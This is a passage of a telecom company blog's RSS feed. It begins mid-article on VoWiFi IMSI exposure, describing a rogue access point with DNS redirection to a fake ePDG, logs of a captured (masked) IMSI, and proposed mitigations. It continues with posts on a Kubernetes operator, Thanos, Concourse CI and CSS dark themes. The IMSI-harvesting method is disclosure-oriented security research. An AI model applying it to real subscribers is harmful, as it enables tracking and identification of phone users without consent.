inherently passive since it cannot know where from (ip) the UE will come from.</p><p><img src="/img/blog/vowifi-imsi-leak/sim-aka.png" alt="sim-aka flow"/></p><h3>EAP-AKA exposes identity</h3><p>Vowifi as mentioned earlier utilises an encryption protocol based on the widely
adopted Extensible Authentication Protocol. EAP itself is just a protocol and
does not define the contents of the data or how exact the data exchanges look
like. EAP-AKA unfortunately exposes the unencrypted user identity during
the authentication session and in this case the user identity is equal to the
imsi.</p><h4>Solution</h4><p>This is the hardest problem to solve since it needs a security layer or settings
that comes before ipsec starts to connect.</p><p>The proposed solutions</p><ul><li>Force the use of conservative peer for eap-aka/sim
and use pseudonym identity (tmsi) to avoid exposing imsi.</li><li>Enable EAP-TTLS in addition to EAP-AKA/SIM</li><li>Only connect trusted/encrypted AP&#x27;s</li></ul><h3>Fake Ipsec termination exposes identity</h3><p>By impersonating a epdg by redirecting all dns requests for any
<code>pub.3gppnetwork.org.</code> to our own fake ipsec termination providing just enough
to catch the imsi.</p><p>A raspberry pie can easily be setup to constantly scan for open wifi networks,
then impersonating the ssid in hope of lure ue&#x27;s to connect. Any UE set to use
VoWiFi connecting to the fake access point will give away their imsi.</p><p>A wifi ssid scan example of what we can automate. In this case the Isfjell-Guest
would have been picked to catch imsi since its open and unencrypted:</p><p><img src="/img/blog/vowifi-imsi-leak/wlan-ssid.png" alt="wifi-ssid"/></p><p>Snippet from the ipsec termination, UE (iPhone 8) exposes imsi several times:</p><pre><code>13[ENC] parsed IKE_AUTH request 2 [ EAP/RES/AKA ]
13[IKE] &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27; is not a reauth identity
13[IKE] &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27; is not a pseudonym
13[IKE] received identity &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27;
13[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA
13[LIB] tried 0 SIM providers, but none had a quintuplet for &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27;
13[IKE] failed to map pseudonym/reauth identity &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27;, fallback to permanent identity request
13[ENC] generating IKE_AUTH response 2 [ EAP/REQ/AKA ]
13[NET] sending packet: from 192.168.17.1[500] to 192.168.17.24[500] (92 bytes)
09[NET] received packet: from 192.168.17.24[500] to 192.168.17.1[500] (140 bytes)
09[ENC] parsed IKE_AUTH request 3 [ EAP/RES/AKA ]
09[IKE] received identity &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27;
09[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA
09[LIB] tried 0 SIM providers, but none had a quintuplet for &#x27;09999994511******@wlan.mnc999.mcc999.3gppnetwork.org&#x27;
09[IKE] EAP method EAP_AKA failed for peer 09999994511******@nai.epc.mnc999.mcc999.3gppnetwork.org
09[ENC] generating IKE_AUTH response 3 [ EAP/FAIL ]
</code></pre><h4>Solution</h4><p>Ipsec clients (UE) are able to verify the identity of the epdg by requesting
and validating a machine certificate proving it is the actual service belonging
to the requested dns address. This means when the client connects, the server
has to provide a valid certificate containing the dns names and signed by a
trusted CA.</p><h2>Raspberry PI 4</h2><p>The specific physical setup used for testing. Older PI&#x27;s should work just fine and also
other platforms that can run dnsmasq, tshark and strongswan for ipsec with
support for eap-aka/sim.</p><p><img src="/img/blog/vowifi-imsi-leak/rpi4-batt.jpg" alt="rpi4 and battery"/></p><p><em>white box is the rpi4 in a original casing and gray box is a battery bank</em></p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Extending Kubernetes for our needs]]></title>
            <link>https://www.wgtwo.com/blog/extending-k8s/</link>
            <guid>extending-k8s/</guid>
            <pubDate>Fri, 21 Feb 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[We are using Kubernetes as our cluster scheduler and this serves us well. However we have a]]></description>
            <content:encoded><![CDATA[<p>We are using Kubernetes as our cluster scheduler and this serves us well. However we have a
few cases where we need to do some additional work.</p><p>One case for example is that we have to use static IPs for some of our services to connect to
Telecom companies as they expect a single IP address to bind to. This address needs to be fixed and
DNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not
using Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist
an Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There
are also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.</p><p>We are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of
that. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with
some Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having
the same IP attached to it, as well as the node running a pod having some very specific Routes set.</p><p>With this scenario in mind we set out to find solutions and all solutions we could think of required haggling
with Kubernetes.</p><h2>Extending Kubernetes</h2><p>There are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean
public APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at
two ways on how to extend Kubernetes.</p><p>Possible ways to go forward:</p><ul><li>Adding a scheduler extender</li><li>Creating an operator/controller</li></ul><p>There are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness
you can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious
downsides.</p><h3>Adding a scheduler extender</h3><p>The Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements
are hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the pods are allowed to
be packed together or in which AZ they are going to run. All of those requirements are collected and points given to each
node on how well they meet the requirements. The node that fits best, gets chosen.</p><p>All of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a
<code>KubeSchedulerConfiguration</code> object that will tell the scheduler to also reach out to a service for additional point scoring.
The SchedulerConfiguration is a JSON file and for further explanations, please have a look at this
excellent <a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/">blog post</a>.</p><p>In our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods
onto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.
That sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.
So we decided against this approach.</p><h3>Creating an operator</h3><p>An Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.
The difference between a controller and an operator is basically that an operator is handling the lifecycle of an
application, whereas a controller may control specific resources that are not associated with a specific application.
They both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the
context of this article, we will consider them to be equal.</p><p>Operators usually consists at least out of a <strong><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">CRD(CustomResourceDefinition)</a></strong>, an <strong>event listener</strong> and a <strong>reconciliation loop</strong>.
The <em>CRD</em> basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment
needs to look like and all its abilities need to be defined in the <em>CRD</em>. The operator will create an <em>event listener</em> for that
<em>CRD</em> as the primary resource and additional <em>event listeners</em> for the secondary resource (most likely pods in this example).
The <em>event listener</em> will let the <em>reconciliation loop</em> know once a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a> operation has been requested on either the primary or
secondary resource. The <em>loop</em> will then try to bring the <em>CRD</em> into the desired state, depending on what operation has been
requested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green
deploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it
from a declarative form into existing resources.</p><p>As our initial problem was making services available on static IP addresses, we chose to explore this approach further,
basically attaching additional IP addresses to the nodes running specific pods.</p><h2>Building an Operator/Controller</h2><p>For building an operator, there are several frameworks out there, but we will only look at the <a href="https://github.com/operator-framework/operator-sdk">operator-framework</a> in
this article.</p><h3>Operator-SDK</h3><p>The Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,
it will generate quite a bit of boilerplate.</p><p>The Operator-SDK supports three different models of creating an operator:</p><ul><li>Helm</li><li>Ansible</li><li>Golang</li></ul><p>Depending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.</p><p><img src="/img/blog/operator/operator-capability-level.png" alt="operator-sdk-capabilites" title="Operator sdk capabilities (Taken from the operator-sdk repo)"/>
<em><a href="https://github.com/operator-framework/operator-sdk/blob/master/README.md">Operator sdk capabilities</a></em></p><p>As we didn&#x27;t want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to
implement our operator in golang. We will be using the operator-sdk version 0.12 for this.</p><h3>What we want to do</h3><p>Looking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to
have an IP address attached to it. This IP address will be given to connecting parties as a entry point to our
system and thus cannot change.</p><p>Features it needs to support</p><ul><li>Reserve IP address from range</li><li>Attach IP address to node running pod</li><li>Detach IP address from node that is not running pod</li><li>Move IP addresses around in case of node failure</li></ul><p>This feature list already shows some things we will not and most likely cannot support. For example autoscaling of
replica sets will not work as an IP address is bound to a node with an assigned pod. There is
a 1-1 association here. However it is still possible to use the self-healing properties of Deployments
in this case.</p><p>When thinking about modelling this behaviour, we basically decided on the following approach:</p><ul><li>Create a IP kind (for reserving the IP Address in the Range)</li><li>Use annotations to attach the IP Address to a pod</li></ul><p>We also thought about creating a StaticIPDeployment kind, but at the end decided against it, as
we feared that the lifecycle management would be way more complicated if we needed to manage a deployment
instead of just controlling the assignment of an IP Address.</p><p>After all this is the first Operator we are going to write and didn&#x27;t want to drown in complexity from day one.
We would rather iterate and scrap everything after we tried it, then going too complex from the start.</p><h3>Implementation</h3><p>The first thing you do when starting off a new operator, is that you initialize the directory of your
operator with the following command:</p><pre><code>operator-sdk new app-operator --repo &lt;YOURREPO&gt;
</code></pre><p>This will create some boilerplate folders and files for you and will look roughly like this:</p><p><img src="/img/blog/operator/operator-structure.png" alt="operator-fs-structure" title="Operator Folder Structure"/></p><p>The next thing you might want to do is then add the boilerplate for a CRD and a Controller:</p><pre><code>operator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP
operator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP
</code></pre><p>After creating the boilerplate, your folder structure will look a lot like this:</p><p><img src="/img/blog/operator/operator-structure-expanded.png" alt="operator-fs-structure-expanded" title="Operator Folder Structure Expanded"/></p><p>The most important files right now are in:</p><ul><li>cmd/manager/main.go (the main program that will run in the cluster)</li><li>pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)</li><li>pkg/controller/ip_controller.go (event listener and reconciliation loop)</li></ul><h4>Creating the CRD</h4><p>To start off, we define how our CRD should look like to be able to manage our IP Address. We do this,
by creating structs in go that have all the fields our CRD shall have. This includes metadata, &quot;spec&quot; and
&quot;status&quot; fields.</p><p>There is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the
openapi spec and other auto-generated code.</p><pre><code>// +k8s:openapi-gen=true
// +kubebuilder:subresource:status
// +kubebuilder:resource:path=ips,scope=Cluster
type IP struct {
    metav1.TypeMeta   `json:&quot;,inline&quot;`
    metav1.ObjectMeta `json:&quot;metadata,omitempty&quot;`

    Spec   IPSpec   `json:&quot;spec,omitempty&quot;`
    Status IPStatus `json:&quot;status,omitempty&quot;`
}
</code></pre><p>The &quot;spec&quot; needs to contain all information the controller needs to create the resource.
The &quot;status&quot; part needs to contain all the bookkeeping information the controller needs to work. In a way the
&quot;status&quot; fields are used as a database for operating Kubernetes (yes, this is oversimplified).</p><pre><code>// +k8s:openapi-gen=true
type IPSpec struct {
    Address string `json:&quot;address&quot;`
    Reassign bool `json:&quot;reassign,omitempty&quot;`
}

// IPStatus defines the observed state of IP
// +k8s:openapi-gen=true
type IPStatus struct {
    Assigned bool   `json:&quot;assigned&quot;`
    Claimed  bool   `json:&quot;claimed&quot;`
    Node     string `json:&quot;node,omitempty&quot;`
    Pod      string `json:&quot;pod,omitempty&quot;`
    Original IPSpec `json:&quot;original,omitempty&quot;`
}
</code></pre><p>As you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is
going to have two fields: &quot;Address&quot; and &quot;Reassign&quot;.
The corresponding &quot;status&quot; part of the resource, has a lot more fields, which we are using for bookkeeping.</p><p>After we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:</p><pre><code>operator-sdk generate k8s
operator-sdk generate openapi
</code></pre><p>NB: This changed since operator-sdk 0.15</p><h4>Creating the controller</h4><p>There are two main parts to the controller. One part that creates a watcher on resources and one part
that reconciles your resource (in our case the IP and Pods).</p><h5>Watching for resource changes</h5><p>The watch code is in our case in the <code>add</code> function of ip_controller.go:</p><pre><code>    // Watch for changes to primary resource IP, as this always requires an action
    err = c.Watch(&amp;source.Kind{Type: &amp;ipv1alpha1.IP{}}, &amp;handler.EnqueueRequestForObject{})
    if err != nil {
        return err
    }

    // Create Filter list triggering on ip.wgtwo.com/ip as annotation
    pred := predicate.Funcs{
        // Ignore the pod if it does not contain annotation ip.wgtwo.com/ip
        CreateFunc: func(e event.CreateEvent) bool {
            return hasAnnotation(e.Meta)
        },
        UpdateFunc: func(e event.UpdateEvent) bool {
            if hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){
                return true
            } else {
                return false
            }
        },
        DeleteFunc: func(e event.DeleteEvent) bool {
            // Evaluates to false if the object has been confirmed deleted.
            return !e.DeleteStateUnknown
        },
    }
    // Watch for all pods having the right annotation
    err = c.Watch(&amp;source.Kind{Type: &amp;corev1.Pod{}}, &amp;handler.EnqueueRequestForObject{}, pred)
</code></pre><p>Here we are creating watchers for all changes to the <code>IP</code> resource and watchers for all create/update/delete operations on
pods, if they have a specific annotation set.</p><p>If any of these conditions are met, the reconciliation loop will be triggered.</p><h5>Reconciliation</h5><p>This is where the business logic of your operator/controller is sitting. The <code>Reconcile</code> function in <code>ip_controller.go</code> will
be triggered whenever one of the watch conditions fits.
We do not know which type of resource triggered the loop, so that is the first thing we need to figure out:</p><pre><code>oip := &amp;ipv1alpha1.IP{}
err := r.client.Get(context.TODO(), request.NamespacedName, oip)
if err == nil {
    ... yes it is a resource of kind IP ... go and do business
}
...
op := &amp;corev1.Pod{}
err = r.client.Get(context.TODO(), request.NamespacedName, op)
if err == nil {
    ... yes it is a resource of kind Pod ... go and do business
}
...
</code></pre><p>In these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary
resource of type pod. Depending on what has happened last we have different scenarios.</p><p>Cases for the IP resource to consider:</p><ul><li>IP is new</li><li>IP has been modified</li><li>IP has been deleted</li></ul><p>Cases for the Pod resource to consider:</p><ul><li>Annotation sticking the IP to the pod has been deleted</li><li>IP needs to be assigned to a pod</li><li>Pod has moved to another node</li><li>Pod has been deleted</li></ul><p>We will not go any further into the detail on what these parts are actually doing, as this is enough
to actually give you an idea on how this can be accomplished.</p><h2>Summary</h2><p>We have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller
has taught us quite a bit about how Kubernetes works and has already saved us work in the past
few months, especially on node failures.</p><p>The operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work
going into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and
we think in the future Kubernetes operators will be the way how stateful components will be managed.</p><h2>Resources / Further Reading</h2><ul><li>Programming Kubernetes by Stefan Schimanski and Michael Hausenblas</li><li><a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/">Creating a custom kube-scheduler</a></li><li><a href="https://github.com/operator-framework/operator-sdk">Operator SDK</a></li></ul>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Towards observability nirvana: infinite metric retention with Thanos]]></title>
            <link>https://www.wgtwo.com/blog/metrics-unlimited-thanos</link>
            <guid>metrics-unlimited-thanos</guid>
            <pubDate>Tue, 28 Jan 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and]]></description>
            <content:encoded><![CDATA[<p>In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and
services. <strong>wgtwo</strong> is no exception here and as we are operating in the TelCo space
we wanted to know more about the usage patterns of our platform over days, months and even years.</p><p>Internally we have been running Prometheus for a long time with a fairly limited retention of 30 days. This did not
allow us to look far enough back in time to make the observations we wanted to.
Luckily for us there already was a solution out there that would fill our needs and in addition to that make our
monitoring stack more resilient. The solution is called <a href="https://thanos.io/">Thanos</a>.</p><h2>Thanos</h2><p>Thanos was originally developed by a company called <a href="https://improbable.io/">Improbable</a> to provide long term storage
for Prometheus. It evolved into a much more complicated component which wildly improved the scalability of the
Prometheus monitoring Stack.</p><p>The basic functionality however is that Thanos will upload the metrics collected by Prometheus onto any service with a
S3-compatible API or any other storage target supported by the Prometheus remote write feature. For readability we
will only refer to it as S3 Storage as this is our storage target.</p><p>We shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric
retention and higher reliability.</p><h3>Thanos Sidecar</h3><p>The Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage
buckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.
Another important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier
as a Store API endpoint to query Prometheus metrics.</p><h3>Thanos Store</h3><p>Thanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the
Thanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets
available in S3.</p><h3>Thanos Querier</h3><p>Querier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned
Store API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the
stores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.</p><h3>Thanos Compactor</h3><p>It does not make a lot of sense to keep old metrics that are scraped every 15 or 30 seconds forever. At some point these
metrics would no longer be useful to make sense of your metrics. This is where
the Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example
aggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you
almost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are
written back into the S3 bucket and the metadata gets updated.</p><h3>Thanos Ruler</h3><p>The Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics
according to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a
local datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable
data source to do this in the required intervals.</p><h2>Architecture in a Cluster</h2><p><img src="/img/blog/thanos/thanos_architecture.png" alt="Thanos Architecture"/></p><p>As we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it
is fairly simple to understand as the components are nicely decoupled from each other.</p><p>An interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually
allows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus
instance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown
in Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.</p><p>This design also allows for an interesting other Use Case: querying multiple clusters. As
long as the storage location used by the sidecars for uploading the metrics is identical, the time series data is
available to the Thanos Store and therefor the Querier and Grafana.
That even allows to run Grafana, Querier and Store in a completely different part of the world if need be.</p><h2>Is it worth it?</h2><h3>Pros</h3><ul><li>highly available Prometheus</li><li>increased reliability (decoupled query component)</li><li>infinite metric storage</li><li>query multiple clusters from a single point</li><li>easy to scale</li></ul><h3>Cons</h3><ul><li>more complex architecture</li><li>increased resource usage</li></ul><h2>What are the biggest benefits for us?</h2><p>As stated in the beginning of this article one of our objectives for implementing Thanos was the increased
metric retention to be able to look back further in time.</p><p>The most interesting features for us are to be able to:</p><ul><li>analyze trends and identify anomalies within the mobile core network</li><li>visualize and graph service usage</li><li>predict service usage on peak days (think New Years Eve)</li><li>observe behaviour over multiple deployments (regions, customers and cloud providers)</li></ul><h2>Summary</h2><p>Even though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further
back in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment
does not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,
we can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can
now be done gradually, which is also a great advantage for us!</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[We killed the butler: Replacing Jenkins with Concourse]]></title>
            <link>https://www.wgtwo.com/blog/replacing-jenkins-with-concourse</link>
            <guid>replacing-jenkins-with-concourse</guid>
            <pubDate>Fri, 20 Dec 2019 00:00:00 GMT</pubDate>
            <description><![CDATA[At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:]]></description>
            <content:encoded><![CDATA[<p>At <strong>wgtwo</strong>, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:</p><ul><li>running unit tests on each pull request</li><li>building and running integration tests with bazel on every merge to the monorepo</li><li>building container images and upload them to the registry</li><li>scanning all images for security flaws</li><li>running acceptance tests in the staging environment</li><li>syncing secrets between different sources</li><li>notifying slack if changes are made in Kubernetes</li></ul><p>We had been using <a href="https://jenkins.io/">Jenkins</a> to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.</p><p><img src="/img/blog/jenkins-to-concourse/jenkins.png" alt="Jenkins"/></p><p>The majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.
We try to do all of our infrastructure configuration via <a href="https://www.gitops.tech/">gitops</a> so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.</p><p>We spent time investigating other options, and eventually settled on <strong><a href="https://concourse-ci.org/">Concourse</a>, a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml</strong>.</p><h2>Infrastructure as code</h2><p>We run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It&#x27;s fast and easy to upgrade and redeploy.</p><p>Within Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.</p><pre><code>jobs:
- name: run-acceptance-tests-staging
  plan:
  - task: run-tests
    config:
      inputs:
      - name: monorepo
      run:
        path: /bin/bash -c runtests.sh
    on_failure:
      put: notify-slack-ci
</code></pre><p><img src="/img/blog/jenkins-to-concourse/concourse_task.png" alt="Concourse task"/></p><p>Pipelines are made up of jobs that run in series or parallel; jobs consist of tasks.
Pipelines, jobs and tasks are described in code and automatically visualised in the UI.
Changes to pipelines are applied by updating the yaml file and running Concourse&#x27;s <a href="https://concourse-ci.org/fly.html">fly cli</a> tool.</p><h2>Containerised deployment</h2><p>Concourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.
This is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.</p><p>We use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.
It look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.
The only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn&#x27;t really too much of an issue.</p><p>There were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.</p><p><img src="/img/blog/jenkins-to-concourse/concourse_pipeline.png" alt="Concourse pipeline"/></p><h2>Debugging</h2><p>Since the tasks all run in containers, it&#x27;s easy to debug issues locally by running the same image on the laptop as is running in Concourse.
Alternatively, the <a href="https://concourse-ci.org/running-tasks.html#fly-execute">fly execute</a> cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.</p><p>The <a href="https://concourse-ci.org/builds.html#fly-intercept">fly intercept</a> tool offers a way to log into a running container in concourse to troubleshoot:</p><pre><code>$ fly intercept -j ecs-services
1: build #27, step: monorepo, type: get
2: build #27, step: notify-slack-ci, type: get
3: build #27, step: notify-slack-ci, type: put
4: build #27, step: run-acceptance-tests-staging, type: task
choose a container: 4
root@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#

</code></pre><h2>Resource types and extending Concourse</h2><p>There are a large number of <a href="https://github.com/concourse/concourse/wiki/Resource-Types">resource types</a> available for Concourse, making it fairly straightforwards to configure pipelines.</p><p>As resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.</p><p>A resource type needs to implement the following executables/scripts:</p><ul><li>check (checking new versions of the resource, eg. is there a new pull request)</li><li>in (pulling a new version of the resource down, eg. download code from a pull request)</li><li>out (pushing a new version of the resource up, eg. push a build result to Github)</li></ul><p>These binaries need to be placed under /opt/resource in the docker container.
Concourse calls these binaries with JSON payload and optional parameters that can all be found <a href="https://concourse-ci.org/implementing-resource-types.html">here</a>.
What is done in those executables/scripts is up to the implementer, but it is really easy to extend concourse using this mechanism.</p><h2>Learning curve</h2><p>The move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it&#x27;s that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.</p><p>The documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we&#x27;re finding it easier and easier to add more.
Similarly, it took some time to settle on how to allocate resources such that we cope with load but aren&#x27;t wasteful at quiet times.</p><h2>Summary</h2><p>The biggest improvements of Concourse over Jenkins have been:</p><ul><li>clean UI, no clicky clicky</li><li>every build uses its own container - no shared dependencies or artifacts</li><li>configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse</li><li>configuration of pipelines in code - good visibility into running tasks</li><li>wide range of resource types</li><li>ability to extend resources</li><li>easy to troubleshoot and debug</li></ul><p>Overall, we&#x27;re pretty pleased with Concourse. There are a few features we&#x27;re eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.</p><h2>References</h2><ul><li><a href="https://github.com/concourse">https://github.com/concourse</a></li><li><a href="https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey">https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey</a></li><li><a href="https://github.com/karlkfi/concourse-dcind">https://github.com/karlkfi/concourse-dcind</a></li><li><a href="https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh">https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh</a></li><li><a href="https://concoursetutorial.com">https://concoursetutorial.com</a></li></ul>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Hacking dark themes with CSS blend modes]]></title>
            <link>https://www.wgtwo.com/blog/hacking-dark-themes-with-css-blend-modes/</link>
            <guid>hacking-dark-themes-with-css-blend-modes/</guid>
            <pubDate>Tue, 25 Jun 2019 00:00:00 GMT</pubDate>
            <description><![CDATA[Like many other companies, Working Group Two has a number of applications which are]]></description>
            <content:encoded><![CDATA[<p>Like many other companies, <a href="/">Working Group Two</a> has a number of applications which are
only available internally or to partners.
Our UI designer (that&#x27;s me) prefers light backgrounds with dark text, but one of our
partners have wanted a dark theme for one of our applications for some time.
We haven&#x27;t been able to prioritize this, but we were using CSS blend modes for a different project,
and wondered if we could use them to quickly put together a dark theme.</p><p>The application in this post is one of our partner portals, which follows the Material Design
guidelines. It’s built with <a href="https://vuejs.org/">Vue</a> and <a href="https://vuetifyjs.com/en/">Vuetify</a>,
but also has some custom components and JS plugins (for uploads, charts, etc).
It took two hours to create the dark theme and deploy it to production, and we&#x27;ll walk
you through the whole process (with screenshots) in this post.</p><h2>What are CSS blend modes?</h2><p>Mozilla has a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode">page</a> which explains
the concept fairly well. In short, blend modes decide what should happen when two colors are
put on top of each other. The default blend mode is <code>normal</code>, which is what most people are used to.
As an example, the <code>normal</code> blend mode paints dark text on top of a light background on the
page you’re reading right now.</p><p>The application we have is light and we want it to be dark, so we need to look for blend modes that
can help with that. Scrolling through the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode">list at MDN</a>,
one mode in particular stands out:</p><pre><code>difference
    The final color is the result of subtracting the darker of the two colors from the lighter one.
    A black layer has no effect, while a white layer inverts the other layer&#x27;s color.
</code></pre><p><img src="/img/blog/blend-modes/01-console-subs-light.png" alt="Starting point, mostly basic Vuetify"/>
<img src="/img/blog/blend-modes/01-console-subs-difference.png" alt="After applying"/></p><p>Okay, that’s actually not too bad. There are some obvious issues, like the color hues being
inverted and everything being way too dark, but it should be possible to make some adjustments.</p><h2>Working with a non-standard blend mode</h2><p>The most jarring issue is that the colors have been inverted.
Our teal logo is now red, and the red &quot;unlocked account&quot; icon we use in development mode is now teal.
This is in line with the documentation for the <code>difference</code> blend mode, but luckily CSS also supports hue-rotation,
so we can just rotate the hue back 180 degrees. Our base style now looks like this:</p><pre><code class="language-css">html.dark-mode {
   mix-blend-mode: difference;
   filter: hue-rotate(180deg);
}
</code></pre><p>Hue is measured in degrees from 0 to 360, so we&#x27;re flipping the hues twice.
Below, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).
All the effects are applied to the same image here in your browser.</p><p>As you can see from the illustration, brightness and saturation
is not accounted for with hue-rotate, so most colors won&#x27;t look the same.
They will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.<!-- -->\<!-- -->
We&#x27;re lucky that our brand color doesn&#x27;t change too much!</p><p>So, this fixes our colors, but we also have to do something about the darkness.
The whole application is pretty much pitch black, and to make it brighter we need to … turn down the brightness:</p><pre><code class="language-css">html.dark-mode {
   mix-blend-mode: difference;
   filter: hue-rotate(180deg) brightness(0.67);
}
</code></pre><p>Let&#x27;s have a look <small>(click to enlarge)</small>:</p><p>That’s a lot better (blend modes are fun!). Our dark theme is close to done now,
but we have one problem remaining: shadows. Because of our blend mode, making
things darker means making them brighter, so all our shadows look like white glows.
Since our base color is white/light gray, we can’t simply change our shadows to white as there would be no contrast.
